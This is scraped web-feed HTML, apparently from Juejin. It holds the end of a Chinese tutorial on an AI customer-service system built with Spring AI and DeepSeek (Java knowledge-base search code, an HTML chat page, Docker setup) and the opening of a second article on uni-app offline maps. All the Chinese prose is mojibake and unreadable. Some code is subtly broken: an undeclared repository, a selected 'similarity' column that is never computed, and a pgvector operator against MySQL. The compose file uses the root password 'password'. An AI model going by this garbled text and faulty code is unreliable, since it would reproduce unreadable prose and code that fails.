<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KnowledgeBaseService</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> JdbcTemplate jdbcTemplate;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> EmbeddingModel embeddingModel;

    <span class="hljs-meta">@Value("${spring.ai.embedding.dimension}")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> embeddingDimension;

    <span class="hljs-comment">/**
     * æœç´¢ç›¸å…³çŸ¥è¯†å†…å®¹
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">searchRelevantContent</span><span class="hljs-params">(String query)</span> {
        <span class="hljs-comment">// å°†æŸ¥è¯¢è½¬æ¢ä¸ºå‘é‡</span>
        List&lt;Double&gt; queryEmbedding = embeddingModel.embed(query);

        <span class="hljs-comment">// åœ¨æ•°æ®åº“ä¸­æœç´¢æœ€ç›¸ä¼¼çš„æ–‡æ¡£</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
            SELECT content, similarity
            FROM knowledge_base,
                 (SELECT ? AS query_vector) AS q
            WHERE kb_vector IS NOT NULL
            ORDER BY kb_vector &lt;=&gt; query_vector
            LIMIT 3
            """</span>;

        List&lt;KnowledgeBase&gt; results = jdbcTemplate.query(sql,
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{queryEmbedding},
            (rs, rowNum) -&gt; {
                <span class="hljs-type">KnowledgeBase</span> <span class="hljs-variable">kb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KnowledgeBase</span>();
                kb.setContent(rs.getString(<span class="hljs-string">"content"</span>));
                kb.setSimilarity(rs.getDouble(<span class="hljs-string">"similarity"</span>));
                <span class="hljs-keyword">return</span> kb;
            });

        <span class="hljs-comment">// ç»„åˆè¿”å›æœ€ç›¸å…³çš„å†…å®¹</span>
        <span class="hljs-keyword">return</span> results.stream()
                .map(KnowledgeBase::getContent)
                .collect(Collectors.joining(<span class="hljs-string">"\n\n"</span>));
    }

    <span class="hljs-comment">/**
     * æ·»åŠ çŸ¥è¯†åˆ°çŸ¥è¯†åº“
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addKnowledge</span><span class="hljs-params">(String title, String content, String category)</span> {
        <span class="hljs-comment">// ç”Ÿæˆå‘é‡è¡¨ç¤º</span>
        List&lt;Double&gt; embedding = embeddingModel.embed(content);

        <span class="hljs-type">KnowledgeBase</span> <span class="hljs-variable">kb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KnowledgeBase</span>();
        kb.setTitle(title);
        kb.setContent(content);
        kb.setCategory(category);
        kb.setVector(embedding);
        kb.setCreatedAt(LocalDateTime.now());

        knowledgeBaseRepository.save(kb);
    }
}
</code></pre>
<h3 data-id="heading-22">ä¸ƒã€å‰ç«¯ç•Œé¢å®ç°</h3>
<h4 data-id="heading-23">7.1 èŠå¤©ç•Œé¢</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f071bda654474427aa43680358ffa24f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=pz1PQ26xuxwx4ruB7SHgJjknZPU%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ™ºèƒ½å®¢æœç³»ç»Ÿ<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-selector-class">.chat-container</span> {
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">600px</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-direction</span>: column;
        }

        <span class="hljs-selector-class">.chat-messages</span> {
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
            <span class="hljs-attribute">overflow-y</span>: auto;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
        }

        <span class="hljs-selector-class">.message</span> {
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
        }

        <span class="hljs-selector-class">.user-message</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e3f2fd</span>;
            <span class="hljs-attribute">text-align</span>: right;
        }

        <span class="hljs-selector-class">.ai-message</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f5f5f5</span>;
        }

        <span class="hljs-selector-class">.chat-input</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">border-top</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;
        }

        <span class="hljs-selector-class">.chat-input</span> <span class="hljs-selector-tag">input</span> {
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
        }

        <span class="hljs-selector-class">.chat-input</span> <span class="hljs-selector-tag">button</span> {
            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2196F3</span>;
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chat-container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chat-messages"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"messages"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chat-input"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"userInput"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥æ‚¨çš„é—®é¢˜..."</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendMessage()"</span>&gt;</span>å‘é€<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">'ws://localhost:8080/ws/chat'</span>);
        <span class="hljs-keyword">const</span> messagesDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'messages'</span>);
        <span class="hljs-keyword">const</span> userInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'userInput'</span>);

        ws.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
            <span class="hljs-title function_">addMessage</span>(<span class="hljs-string">'AI'</span>, event.<span class="hljs-property">data</span>);
        };

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendMessage</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> message = userInput.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
            <span class="hljs-keyword">if</span> (!message) <span class="hljs-keyword">return</span>;

            <span class="hljs-title function_">addMessage</span>(<span class="hljs-string">'USER'</span>, message);
            ws.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
                <span class="hljs-attr">userId</span>: <span class="hljs-string">'user123'</span>,
                <span class="hljs-attr">sessionId</span>: <span class="hljs-string">'session456'</span>,
                <span class="hljs-attr">message</span>: message
            }));

            userInput.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
        }

        <span class="hljs-keyword">function</span> <span class="hljs-title function_">addMessage</span>(<span class="hljs-params">role, content</span>) {
            <span class="hljs-keyword">const</span> messageDiv = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
            messageDiv.<span class="hljs-property">className</span> = <span class="hljs-string">`message <span class="hljs-subst">${role.toLowerCase()}</span>-message`</span>;
            messageDiv.<span class="hljs-property">textContent</span> = content;
            messagesDiv.<span class="hljs-title function_">appendChild</span>(messageDiv);
            messagesDiv.<span class="hljs-property">scrollTop</span> = messagesDiv.<span class="hljs-property">scrollHeight</span>;
        }

        userInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keypress'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'Enter'</span>) <span class="hljs-title function_">sendMessage</span>();
        });
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h3 data-id="heading-24">å…«ã€ç³»ç»Ÿéƒ¨ç½²ä¸ç›‘æ§</h3>
<h4 data-id="heading-25">8.1 éƒ¨ç½²æ¶æ„</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/701c01c1aa474c52991383f4fd9a464a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo5Lit6aOY6I2h55qE6K6w5b-G:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768451048&amp;x-signature=%2FfxwaIYk22yJVOgvCrZZ0VIS0o8%3D" alt="" loading="lazy"/></p>
<p><strong>éƒ¨ç½²è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>åº”ç”¨æœåŠ¡å™¨</strong>ï¼šéƒ¨ç½²Spring Bootåº”ç”¨ï¼ˆå»ºè®®ä½¿ç”¨Dockerå®¹å™¨åŒ–ï¼‰</li>
<li><strong>æ•°æ®åº“æœåŠ¡å™¨</strong>ï¼šMySQLä¸»ä»å¤åˆ¶é…ç½®</li>
<li><strong>ç¼“å­˜æœåŠ¡å™¨</strong>ï¼šRedisé›†ç¾¤éƒ¨ç½²</li>
<li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šNginxåå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡</li>
</ol>
<h4 data-id="heading-26">8.2 Dockeréƒ¨ç½²é…ç½®</h4>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM openjdk:17-jdk-slim
WORKDIR /app
COPY target/customer-service-1.0.jar app.jar
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]
</code></pre>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">app:</span>
    <span class="hljs-attr">build:</span> <span class="hljs-string">.</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8080:8080"</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_DATASOURCE_URL=jdbc:mysql://db:3306/customer_service</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_REDIS_HOST=redis</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span>

  <span class="hljs-attr">db:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:8.0</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=password</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_DATABASE=customer_service</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mysql-data:/var/lib/mysql</span>

  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:7-alpine</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis-data:/data</span>
</code></pre>
<h4 data-id="heading-27">8.3 ç›‘æ§æŒ‡æ ‡</h4>
<p>ç³»ç»Ÿéœ€è¦ç›‘æ§ä»¥ä¸‹å…³é”®æŒ‡æ ‡ï¼š</p>
<ul>
<li><strong>å“åº”æ—¶é—´</strong>ï¼šAIå“åº”çš„å¹³å‡å»¶è¿Ÿ</li>
<li><strong>å¹¶å‘æ•°</strong>ï¼šåŒæ—¶åœ¨çº¿çš„ä¼šè¯æ•°é‡</li>
<li><strong>å‡†ç¡®ç‡</strong>ï¼šç”¨æˆ·æ»¡æ„åº¦è¯„åˆ†</li>
<li><strong>Tokenæ¶ˆè€—</strong>ï¼šAPIè°ƒç”¨çš„æˆæœ¬æ§åˆ¶</li>
<li><strong>é”™è¯¯ç‡</strong>ï¼šç³»ç»Ÿå¼‚å¸¸å’Œå¤±è´¥ç‡</li>
</ul>
<h3 data-id="heading-28">ä¹ã€æœ€ä½³å®è·µ</h3>
<h4 data-id="heading-29">9.1 æç¤ºè¯å·¥ç¨‹</h4>
<p>è‰¯å¥½çš„æç¤ºè¯è®¾è®¡æ˜¯æå‡AIå“åº”è´¨é‡çš„å…³é”®ï¼š</p>
<ol>
<li><strong>è§’è‰²å®šä¹‰æ¸…æ™°</strong>ï¼šæ˜ç¡®AIçš„å®šä½å’ŒèŒè´£</li>
<li><strong>ä¸Šä¸‹æ–‡å……åˆ†</strong>ï¼šæä¾›è¶³å¤Ÿçš„èƒŒæ™¯ä¿¡æ¯</li>
<li><strong>è¾“å‡ºæ ¼å¼è§„èŒƒ</strong>ï¼šæŒ‡å®šå“åº”çš„ç»“æ„å’Œæ ¼å¼</li>
</ol>
<h4 data-id="heading-30">9.2 æ€§èƒ½ä¼˜åŒ–</h4>
<ul>
<li><strong>ç¼“å­˜ç­–ç•¥</strong>ï¼šå¯¹å¸¸è§é—®é¢˜è¿›è¡Œç¼“å­˜</li>
<li><strong>æ‰¹å¤„ç†</strong>ï¼šåˆå¹¶å¤šä¸ªè¯·æ±‚å‡å°‘APIè°ƒç”¨</li>
<li><strong>å¼‚æ­¥å¤„ç†</strong>ï¼šä½¿ç”¨å¼‚æ­¥éé˜»å¡IO</li>
<li><strong>è¿æ¥æ± </strong>ï¼šåˆç†é…ç½®æ•°æ®åº“å’ŒHTTPè¿æ¥æ± </li>
</ul>
<h3 data-id="heading-31">åã€æ€»ç»“</h3>
<p>æœ¬æ–‡è¯¦ç»†ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨Spring AI 1.0æ„å»ºä¸€ä¸ªå®Œæ•´çš„æ™ºèƒ½å®¢æœç³»ç»Ÿï¼Œå¹¶é€šè¿‡DeepSeekå¤§æ¨¡å‹å®ç°äº†æ™ºèƒ½å¯¹è¯èƒ½åŠ›ã€‚</p>
<h6 data-id="heading-32"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7592531796044185615</link>    <guid>https://juejin.cn/post/7592531796044185615</guid>    <pubDate>2026-01-08T03:08:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592531796044185615" data-draft-id="7592524811860803618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,Trae"/> <meta itemprop="datePublished" content="2026-01-08T03:08:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå‰‘ä¸€"/> <meta itemprop="url" content="https://juejin.cn/user/4147782344247918"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-appä½¿ç”¨ç“¦ç‰‡å®ç°ç¦»çº¿åœ°å›¾çš„ä¸¤ç§æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4147782344247918/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå‰‘ä¸€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:08:11.000Z" title="Thu Jan 08 2026 03:08:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘æ¥åˆ°ä¸€ä¸ªå®‰å“Appçš„æ´»å„¿ï¼Œè™½ç„¶åŠŸèƒ½ä¸Šä¸ç®—å¤æ‚ï¼Œä½†å› ä¸ºåŸæœ¬æ²¡æ€ä¹ˆåšè¿‡å®‰å“ç«¯ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯"æ‘¸ç€çŸ³å¤´è¿‡æ²³"ã€‚ç®€å•å†™ä¸€ä¸‹è¸©è¿‡çš„å‘å’Œæ·Œçš„æ°´å§~</p>
<p>uni-appå®ç°ç¦»çº¿åœ°å›¾ä¸»è¦ç”¨ <strong>leafletjs</strong> å®ç°ï¼Œä½†æ˜¯å› ä¸ºåœ¨å®‰å“ç«¯è¿è¡Œï¼Œå­˜åœ¨æ¸²æŸ“é—®é¢˜ï¼Œæ‰€ä»¥è¿˜è¦ç”¨ä¸Š <strong>renderjs</strong>ã€‚</p>
<h2 data-id="heading-0">å®ç°æ–¹æ¡ˆä¸€ï¼šweb-view</h2>
<p>å› ä¸ºuni-appå¼•å…¥ç¬¬ä¸‰æ–¹å¯ä»¥é‡‡ç”¨ä¼ ç»Ÿçš„ <code>NPM</code> å®‰è£…çš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥é‡‡ç”¨å¼•å…¥æ‰“åŒ…å®Œçš„<code>jsæ–‡ä»¶</code>çš„æ–¹å¼ã€‚</p>
<p>è¿™é‡Œé‡‡ç”¨ <code>leafletjs</code> æ‰“åŒ…å®Œçš„æ–‡ä»¶ï¼Œå°† <code>leafletjs</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹å†…ã€‚</p>
<p>åœ¨ç½‘ä¸Šä¸‹è½½äº†å…¬å¼€çš„ç“¦ç‰‡åœ°å›¾å›¾ç‰‡ï¼Œä»¥ <code>{z}/{x}/{y}</code> çš„ç›®å½•ç»“æ„æ”¾å…¥ <code>tiles</code> æ–‡ä»¶å¤¹ä¸­ï¼Œå°† <code>tiles</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹å†…ã€‚</p>
